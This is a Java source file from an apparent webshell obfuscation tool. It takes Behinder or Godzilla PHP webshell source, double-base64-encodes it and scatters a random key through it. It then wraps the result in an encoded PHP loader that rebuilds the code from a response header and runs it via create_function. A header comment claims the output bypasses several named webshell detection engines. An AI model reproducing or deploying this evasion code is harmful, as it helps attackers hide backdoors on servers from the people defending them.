package encode;

import application.RandomString;

import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Random;

public class PhpEncodeDemo4 {
    String tamplate;
    String sourcecode;
    String key;
    String MScode;

    public PhpEncodeDemo4() {
    }

    public PhpEncodeDemo4(String tamplate, String sourcecode, String key) {
        this.tamplate = tamplate;
        this.sourcecode = sourcecode;
        this.key = key;
    }

    public static String GetDescribe(){
        return "/*\n" +
                " * By: XG小刚\n" +
                " * Time: 2023-09-13_demo4\n" +
                " * Bypass: 牧云、伏魔、河马在线、河马本地(1.8.2)\n" +
                " * 需php版本 <= 7.1\n" +
                " */";
    }

    public String[] Run(){

        if(!sourcecode.isEmpty()){
            try {
                sourcecode = sourcecode.replace("<?php", "").replace("?>", "").trim();
                byte[] bytes = sourcecode.getBytes(StandardCharsets.UTF_8);

                String base64code = Base64.getEncoder().encodeToString(Base64.getEncoder().encode(bytes));
                if(this.key.equals("默认随机")){
                    this.key = RandomString.getRString(8);
                }

                StringBuilder stringBuilder = new StringBuilder(base64code);
                int aa = new Random().nextInt((stringBuilder.length())/2)+1;
                for (int i = aa;  i > 0; i = new Random().nextInt(i)) {
                    stringBuilder.insert(i,this.key);
                }
                base64code = stringBuilder.toString();


                String demo = "PD9waHAKJHVzZXJuYW1lID0gJyRrZXkkJzsKJHBhc3N3b3JkID0gJyRiYXNlNjRjb2RlJCc7CmhlYWRlcignZGRkZGRkOicuJHVzZXJuYW1lKTsKJGFyciA9IGFwYWNoZV9yZXNwb25zZV9oZWFkZXJzKCk7CiR0ZW1wbGF0ZV9zb3VyY2U9Jyc7CmZvcmVhY2ggKCRhcnIgYXMgJGsgPT4gJHYpIHsKICAgIGlmICgka1swXSA9PSAnZCcgJiYgJGtbNF0gPT0gJ2QnKSB7CiAgICAgICAgJHRlbXBsYXRlX3NvdXJjZSA9IHN0cl9yZXBsYWNlKCR2LCcnLCRwYXNzd29yZCk7CiAgICB9Cn0KJHRlbXBsYXRlX3NvdXJjZSA9IGJhc2U2NF9kZWNvZGUoJHRlbXBsYXRlX3NvdXJjZSk7CiR0ZW1wbGF0ZV9zb3VyY2UgPSBiYXNlNjRfZGVjb2RlKCR0ZW1wbGF0ZV9zb3VyY2UpOwoka2V5ID0gJ3RlbXBsYXRlX3NvdXJjZSc7CiRhZXNfZGVjb2RlPSQka2V5OwokbmV3ZnVuYyA9IGNyZWF0ZV9mdW5jdGlvbignJywgJGFlc19kZWNvZGUpOwokbmV3ZnVuYygpOw==";
                MScode = new String(Base64.getDecoder().decode(demo));

                MScode = MScode.replace("$key$",this.key);
                MScode = MScode.replace("$base64code$",base64code);

                return new String[]{this.MScode,""};
            }catch (Exception e){
                return new String[]{"加密失败",""};
            }
        }else {
            return new String[]{"请输入冰蝎、哥斯拉php源码",""};
        }

    }
}
